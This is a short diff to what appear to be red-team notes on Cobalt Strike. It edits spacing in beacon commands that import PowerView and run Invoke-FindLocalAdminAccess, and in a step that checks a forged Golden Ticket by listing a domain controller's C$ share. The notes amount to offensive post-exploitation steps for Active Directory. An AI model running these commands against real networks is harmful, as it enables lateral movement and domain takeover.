@@ -26,7 +26,7 @@ Find where we are a local admin
 
 ```
 beacon: powershell-import /root/PowerTools/PowerView/powerview.ps1
-beacon:Invoke-FindLocalAdminAccess
+beacon: Invoke-FindLocalAdminAccess
 ```
 
 Login to target where we are local admin
@@ -63,7 +63,7 @@ Need four items
 
 With that Right Click-->Access-->Golden Ticket-->Input Four fields-->Build
 
-Verify it works: shell dir \\[DC]\C$
+Verify it works: #shell dir \\[DC]\C$
 ```
 
 
